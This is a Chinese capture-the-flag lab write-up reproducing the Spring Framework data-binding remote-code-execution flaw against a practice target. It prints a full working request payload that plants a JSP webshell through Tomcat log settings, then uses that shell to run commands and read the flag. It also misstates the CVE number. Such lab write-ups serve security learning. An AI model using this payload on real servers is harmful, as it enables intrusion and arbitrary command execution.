## 漏洞简介：

Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java
企业级应用的开发难度和开发周期,2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK
9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。

  

## 漏洞环境：

春秋云镜中的漏洞靶标，CVE编号为CVE-2022-23906

  

## 漏洞复现：

访问漏洞环境

打开burpsuite和开启代理

![](https://image.3001.net/images/20230611/1686490267_6485cc9bf09010b51aeaa.png!small)

  

  

  

  

  

  

![](https://image.3001.net/images/20230611/1686490307_6485ccc37b86e1fb55f95.png!small)

  

刷新网页抓取数据包

![](https://image.3001.net/images/20230611/1686490334_6485ccde3c28e94613e70.png!small)

  

把下面的请求包替换掉原来的

作用（更改 Apache Tomcat 中的日志记录配置，并将日志写入为 JSP 文件）

> GET
> /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
> HTTP/1.1
>
> Host: localhost:8080
>
> Accept-Encoding: gzip, deflate
>
> Accept: */*
>
> Accept-Language: en
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
>
> Connection: close
>
> suffix: %>//
>
> c1: Runtime
>
> c2: <%
>
> DNT: 1

只需更改Host：内容即可

![](https://image.3001.net/images/20230611/1686490395_6485cd1b69a6e67190bb7.png!small)

点击Forward放包

  

如果不成功报错就还需改（没有报错就忽略）

Accept-Encoding:

Accept:

Accept-Language:

User-Agent:

  

访问http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=id

然后就可以使用 JSP webshell 成功执行任意命令：

![](https://image.3001.net/images/20230611/1686490540_6485cdaca9cff70f73f4b.png!small)

这里我们需要获取flag

>
> http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=cat%20../../../../../../../../flag

![](https://image.3001.net/images/20230611/1686490608_6485cdf0ae6efd8ec74db.png!small)

> flag{17412c95-6ae4-4b75-bdf2-1e0302c27c08}

  

